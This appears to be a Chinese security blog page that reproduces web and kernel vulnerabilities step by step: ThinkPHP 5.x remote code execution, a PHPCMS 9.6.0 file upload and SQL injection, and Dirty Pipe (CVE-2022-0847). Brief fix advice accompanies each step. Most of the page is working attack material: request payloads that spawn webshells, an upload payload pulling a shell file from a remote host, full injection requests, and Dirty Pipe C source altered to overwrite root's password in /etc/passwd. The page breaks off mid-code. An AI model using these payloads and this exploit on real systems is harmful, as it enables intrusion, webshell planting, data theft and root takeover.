<h2 id="step7-thinkphp反序列化漏洞"><a href="#step7-thinkphp反序列化漏洞" class="headerlink" title="step7:thinkphp反序列化漏洞"></a>step7:thinkphp反序列化漏洞</h2><h3 id="漏洞概述：-6"><a href="#漏洞概述：-6" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>ThinkPHP是一款国内流行的开源PHP框架，攻击者可向缓存文件内写入PHP代码，导致远程代码执行。该漏洞出现的原因在于ThinkPHP5框架底层对控制器名过滤不严，从而让攻击者可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞</p>
<h3 id="漏洞影响版本：-6"><a href="#漏洞影响版本：-6" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>5.x &lt; 5.1.31, &lt;&#x3D; 5.0.23</p>
<h3 id="漏洞复现：-6"><a href="#漏洞复现：-6" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>1.漏洞利用方式：</p>
<p>第一种：利用system函数远程命令执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E1.png"></p>
<p>第二种：通过phpinfo函数写出phpinfo()的信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2.png"></p>
<p>第三种：利用assert函数进行getshell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=assert&amp;method=get&amp;server[REQUEST_METHOD]=eval($_POST[&#x27;1&#x27;])</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">数据包：</span><br><span class="line">GET /thinkphp_5.0.22/public/index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: 192.168.88.111</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 95</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=eval($_POST[&#x27;1&#x27;])</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E3.png"></p>
<p>2.蚁剑进行链接：</p>
<p>a.把poc中的参数依次添加到蚁剑中的body参数中</p>
<p><img src="/2023/08/19/images1/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5.png"></p>
<p><img src="/2023/08/19/images1/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E4.png"></p>
<p>getshell成功</p>
<p><img src="/2023/08/19/images1/thinkphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E6.png"></p>
<h3 id="修复方案：-6"><a href="#修复方案：-6" class="headerlink" title="修复方案："></a>修复方案：</h3><p>升级ThinkPHP至安全版本</p>
<p>在think\App类的module方法的获取控制器的代码后面加上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&#x27;/^[A-Za-z](\w|\.)*$/&#x27;, $controller)) &#123;</span><br><span class="line">    throw new HttpException(404, &#x27;controller not exists:&#x27; . $controller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Step8-phpcms9-6-0任意文件上传漏洞"><a href="#Step8-phpcms9-6-0任意文件上传漏洞" class="headerlink" title="Step8:phpcms9.6.0任意文件上传漏洞"></a>Step8:phpcms9.6.0任意文件上传漏洞</h2><h3 id="漏洞概述：-7"><a href="#漏洞概述：-7" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>PHPCMS 9.6.0版本中的libs&#x2F;classes&#x2F;attachment.class.php文件存在漏洞,该漏洞源于PHPCMS程序在下载远程&#x2F;本地文件时没有对文件的类型做正确的校验。远程攻击者可以利用该漏洞上传并执行任意的PHP代码。</p>
<h3 id="漏洞影响版本：-7"><a href="#漏洞影响版本：-7" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>PHPCMS v9.6.0</p>
<h3 id="漏洞复现：-7"><a href="#漏洞复现：-7" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>1、会员注册填写信息，bp抓包</p>
<p><img src="/2023/08/19/images1/phpcms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A01.jpg"></p>
<p>2、构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">siteid=1&amp;modelid=11&amp;username=test&amp;password=test123456&amp;pwdconfirm=test123456&amp;email=11111111115%40qq.com&amp;nickname=test5&amp;info[content]=&lt;img src=http://192.168.88.162/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/phpcms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A02.jpg"></p>
<p>3、成功上传</p>
<p><img src="/2023/08/19/images1/phpcms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A03.jpg"></p>
<p>4、用蚁剑连接成功getshell</p>
<p><img src="/2023/08/19/images1/phpcms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A04.jpg"></p>
<h3 id="修复方案：-7"><a href="#修复方案：-7" class="headerlink" title="修复方案："></a>修复方案：</h3><p>打开phpcms\libs\classes\attachment.class.php</p>
<p>在168行添加如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(!stripos($ext,$filename))&#123;</span><br><span class="line">    $arryfilename = explode(&quot;|&quot;, $ext);</span><br><span class="line">    foreach($arryfilename as $n=&gt;$fn)&#123;</span><br><span class="line">                if($fn)&#123;</span><br><span class="line">                       $filename = $fn;</span><br><span class="line">                        continue;</span><br><span class="line">                &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="step9-phpcms9-6-0的SQL注入漏洞"><a href="#step9-phpcms9-6-0的SQL注入漏洞" class="headerlink" title="step9:phpcms9.6.0的SQL注入漏洞"></a>step9:phpcms9.6.0的SQL注入漏洞</h2><h3 id="漏洞概述：-8"><a href="#漏洞概述：-8" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>由于&#x2F;modules&#x2F;attachment&#x2F;attachments.php的过滤函数的缺陷导致了可以绕过它的过滤机制形成SQL注入漏洞，可导致数据库中数据泄漏。</p>
<h3 id="漏洞影响版本：-8"><a href="#漏洞影响版本：-8" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>phpcms9.6.0</p>
<h3 id="漏洞复现：-8"><a href="#漏洞复现：-8" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>第一步：先拿到cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">数据包如下：</span><br><span class="line">GET /phpcms/install_package/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1 HTTP/1.1</span><br><span class="line">Host: 192.168.88.111</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.88.111/phpcms/install_package/index.php?m=member&amp;c=content&amp;a=upload_video</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: Hopsm_admin_username=a252UtNpgn2aD6sAN5C_lny-hPRsRI6lkl-aGhFxD-fYtsE; Hopsm_siteid=c5c5LE-86crjs5-lJPkkybhA4DVK2NsJ5tghFLUV; Hopsm_userid=3250N2fKQZQEQXH7QJGLDgmGXUubDRzQ2tBRpvPh; Hopsm_admin_email=8a195c21BGr_KpdCGgmXsDJEYt53vc2MjiyoaZsv3IT0YCCe2vZXF__POu5SJcw; Hopsm_sys_lang=0155w2UtARl5WtGB3MVN8A3lmL9o2-7dLcQJazZXI0vbUQ; PHPSESSID=svanr140i0ilmu0t9epbc63gf7</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/phpcms-sql%E6%B3%A8%E5%85%A51.png"></p>
<p>第二步：将这个cookie值作为userid_flash的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">数据包如下：</span><br><span class="line">POST /phpcms/install_package/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26&amp;XDEBUG_SESSION_START=PHPSTORM HTTP/1.1</span><br><span class="line">Host: 192.168.88.111</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 55</span><br><span class="line"></span><br><span class="line">userid_flash=86a4fopiANPPhau4O8pMCfKO_i_yqusL1jqe2dqV</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/phpcms-sql%E6%B3%A8%E5%85%A52.png"></p>
<p>这里urldecoded的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;id=%*27 and updatexml(1,concat(1,(user()),1)#&amp;m=1&amp;f=haha&amp;modelid=2&amp;catid=7&amp;</span><br></pre></td></tr></table></figure>

<p>第三步:得到wknv_att_json的值，并作为a_k的payload值，得到sql语句执行后的结果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">数据包如下：</span><br><span class="line">GET /phpcms/install_package/index.php?m=content&amp;c=down&amp;a_k=fc9btacWMhZ-PRawRK0XWj3_wlCoJXnuA8PqbiwS3Y3WOYfVlHgIQxkK1mZljjprx-eUixeTP21L9Eg8bFKaIYxN446pLGPtJMWvX_Ipsm3XQemvklBrkFEPZuhY4VtUfu4G3NtP4gORisPHDgva30VKjyfUeZDR6veE9CqdMcyTumGVYIi2h_M HTTP/1.1</span><br><span class="line">Host: 192.168.88.111</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.88.111/phpcms/install_package/index.php?m=member&amp;c=content&amp;a=upload_video</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: Hopsm_admin_username=a252UtNpgn2aD6sAN5C_lny-hPRsRI6lkl-aGhFxD-fYtsE; Hopsm_siteid=c5c5LE-86crjs5-lJPkkybhA4DVK2NsJ5tghFLUV; Hopsm_userid=3250N2fKQZQEQXH7QJGLDgmGXUubDRzQ2tBRpvPh; Hopsm_admin_email=8a195c21BGr_KpdCGgmXsDJEYt53vc2MjiyoaZsv3IT0YCCe2vZXF__POu5SJcw; Hopsm_sys_lang=0155w2UtARl5WtGB3MVN8A3lmL9o2-7dLcQJazZXI0vbUQ; PHPSESSID=svanr140i0ilmu0t9epbc63gf7</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/phpcms-sql%E6%B3%A8%E5%85%A53.png"></p>
<h3 id="修复方案：-8"><a href="#修复方案：-8" class="headerlink" title="修复方案："></a>修复方案：</h3><p>1.更新phpcms的版本或者打补丁</p>
<p>2.修改waf规则</p>
<p>3.找到配置文件&#x2F;phpcms&#x2F;modules&#x2F;content&#x2F;down.php修改代码17行，89行，120行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">17行源码：</span><br><span class="line">parse_str($a_k);</span><br><span class="line">17行修改后的源码：</span><br><span class="line">$a_k = safe_replace($a_k); parse_str($a_k);</span><br><span class="line">89行源码：、</span><br><span class="line">parse_str($a_k);</span><br><span class="line">89行修改后的源码：</span><br><span class="line">$a_k = safe_replace($a_k); parse_str($a_k);</span><br><span class="line">120行源码：</span><br><span class="line">file_down($fileurl, $filename);</span><br><span class="line">120行修改后的源码：</span><br><span class="line">$fileurl = str_replace(array(‘&lt;‘,’&gt;’), ”,$fileurl); file_down($fileurl, $filename);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/19/images1/phpcms-sql%E6%B3%A8%E5%85%A54.png"></p>
<h2 id="step10-linux内核提权漏洞"><a href="#step10-linux内核提权漏洞" class="headerlink" title="step10:linux内核提权漏洞"></a>step10:linux内核提权漏洞</h2><h3 id="漏洞概述：-9"><a href="#漏洞概述：-9" class="headerlink" title="漏洞概述："></a>漏洞概述：</h3><p>Linux 内核中的一个权限提升漏洞（CVE-2022-0847，也称为“Dirty Pipe”），允许非特权用户注入和覆盖任意只读文件中的数据，导致权限提升，并最终获得root权限。该漏洞影响了 Linux Kernel 5.8 及更高版本。</p>
<h3 id="漏洞影响版本：-9"><a href="#漏洞影响版本：-9" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h3><p>Linux Kernel版本 &gt;&#x3D; 5.8</p>
<p>Linux Kernel版本 &lt; 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.10</p>
<h3 id="漏洞复现：-9"><a href="#漏洞复现：-9" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi compile.sh</span><br><span class="line">gcc exploit.c -o exploit</span><br><span class="line">:wq</span><br><span class="line">./compile.sh</span><br><span class="line">./exploit</span><br></pre></td></tr></table></figure>

<p>将如下代码保存为exploit.c文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">poc如下:</span><br><span class="line">/* SPDX-License-Identifier: GPL-2.0 */</span><br><span class="line">/*</span><br><span class="line"> * Copyright 2022 CM4all GmbH / IONOS SE</span><br><span class="line"> *</span><br><span class="line"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span><br><span class="line"> *</span><br><span class="line"> * Proof-of-concept exploit for the Dirty Pipe</span><br><span class="line"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span><br><span class="line"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span><br><span class="line"> * file contents in the page cache, even if the file is not permitted</span><br><span class="line"> * to be written, immutable or on a read-only mount.</span><br><span class="line"> *</span><br><span class="line"> * This exploit requires Linux 5.8 or later; the code path was made</span><br><span class="line"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span><br><span class="line"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span><br><span class="line"> * there before, it just provided an easy way to exploit it.</span><br><span class="line"> *</span><br><span class="line"> * There are two major limitations of this exploit: the offset cannot</span><br><span class="line"> * be on a page boundary (it needs to write one byte before the offset</span><br><span class="line"> * to add a reference to this page to the pipe), and the write cannot</span><br><span class="line"> * cross a page boundary.</span><br><span class="line"> *</span><br><span class="line"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span><br><span class="line"> *</span><br><span class="line"> * Further explanation: https://dirtypipe.cm4all.com/</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line"></span><br><span class="line">#ifndef PAGE_SIZE</span><br><span class="line">#define PAGE_SIZE 4096</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span><br><span class="line"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span><br><span class="line"> */</span><br><span class="line">static void prepare_pipe(int p[2])</span><br><span class="line">&#123;</span><br><span class="line">	if (pipe(p)) abort();</span><br><span class="line"></span><br><span class="line">	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);</span><br><span class="line">	static char buffer[4096];</span><br><span class="line"></span><br><span class="line">	/* fill the pipe completely; each pipe_buffer will now have</span><br><span class="line">	   the PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">	for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">		write(p[1], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* drain the pipe, freeing all pipe_buffer instances (but</span><br><span class="line">	   leaving the flags initialized) */</span><br><span class="line">	for (unsigned r = pipe_size; r &gt; 0;) &#123;</span><br><span class="line">		unsigned n = r &gt; sizeof(buffer) ? sizeof(buffer) : r;</span><br><span class="line">		read(p[0], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* the pipe is now empty, and if somebody adds a new</span><br><span class="line">	   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span><br><span class="line">	   will be mergeable */</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line">	const char *const path = &quot;/etc/passwd&quot;;</span><br><span class="line"></span><br><span class="line">        printf(&quot;Backing up /etc/passwd to /tmp/passwd.bak ...\n&quot;);</span><br><span class="line">        FILE *f1 = fopen(&quot;/etc/passwd&quot;, &quot;r&quot;);</span><br><span class="line">        FILE *f2 = fopen(&quot;/tmp/passwd.bak&quot;, &quot;w&quot;);</span><br><span class="line"></span><br><span class="line">        if (f1 == NULL) &#123;</span><br><span class="line">            printf(&quot;Failed to open /etc/passwd\n&quot;);</span><br><span class="line">            exit(EXIT_FAILURE);</span><br><span class="line">        &#125; else if (f2 == NULL) &#123;</span><br><span class="line">            printf(&quot;Failed to open /tmp/passwd.bak\n&quot;);</span><br><span class="line">            fclose(f1);</span><br><span class="line">            exit(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        char c;</span><br><span class="line">        while ((c = fgetc(f1)) != EOF)</span><br><span class="line">            fputc(c, f2);</span><br><span class="line"></span><br><span class="line">        fclose(f1);</span><br><span class="line">        fclose(f2);</span><br><span class="line"></span><br><span class="line">	loff_t offset = 4; // after the &quot;root&quot;</span><br><span class="line">	const char *const data = &quot;:$1$aaron$pIwpJwMMcozsUxAtRa85w.:0:0:test:/root:/bin/sh\n&quot;; // openssl passwd -1 -salt aaron aaron </span><br><span class="line">        printf(&quot;Setting root password to \&quot;aaron\&quot;...&quot;);</span><br><span class="line">	const size_t data_size = strlen(data);</span><br><span class="line"></span><br><span class="line">	if (offset % PAGE_SIZE == 0) &#123;</span><br><span class="line">		fprintf(stderr, &quot;Sorry, cannot start writing at a page boundary\n&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	const loff_t next_page = (offset | (PAGE_SIZE - 1)) + 1;</span><br><span class="line">	const loff_t end_offset = offset + (loff_t)data_size;</span><br><span class="line">	if (end_offset &gt; next_page) &#123;</span><br><span class="line">		fprintf(stderr, &quot;Sorry, cannot write across a page boundary\n&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* open the input file and validate the specified offset */</span><br><span class="line">	const int fd = open(path, O_RDONLY); // yes, read-only! :-)</span><br><span class="line">	if (fd &lt; 0) &#123;</span><br><span class="line">		perror(&quot;open failed&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	struct stat st;</span><br><span class="line">	if (fstat(fd, &amp;st)) &#123;</span><br><span class="line">		perror(&quot;stat failed&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (offset &gt; st.st_size) &#123;</span><br><span class="line">		fprintf(stderr, &quot;Offset is not inside the file\n&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (end_offset &gt; st.st_size) &#123;</span><br><span class="line">		fprintf(stderr, &quot;Sorry, cannot enlarge the file\n&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* create the pipe with all flags initialized with</span><br><span class="line">	   PIPE_BUF_FLAG_CAN_MERGE */</span><br><span class="line">	int p[2];</span><br><span class="line">	prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">	/* splice one byte from before the specified offset into the</span><br><span class="line">	   pipe; this will add a reference to the page cache, but</span><br><span class="line">	   since copy_page_to_iter_pipe() does not initialize the</span><br><span class="line">	   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span><br><span class="line">	--offset;</span><br><span class="line">	ssize_t nbytes = splice(fd, &amp;offset, p[1], NULL, 1, 0);</span><br><span class="line">	if (nbytes &lt; 0) &#123;</span><br><span class="line">		perror(&quot;splice failed&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	if (nbytes == 0) &#123;</span><br><span class="line">		fprintf(stderr, &quot;short splice\n&quot;);</span><br><span class="line">		return EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* the following write will not create a new pipe_buffer, but</span><br><span class="line">	   will instead write into the page cache, because of the</span><br><span class="line">	   PIPE_BUF_FLAG_CAN_MERGE flag */</span><br><span class="line">	nbytes = write(p[1], data, data_size);</span><br><span class="line">	if (nbytes &lt; 0) 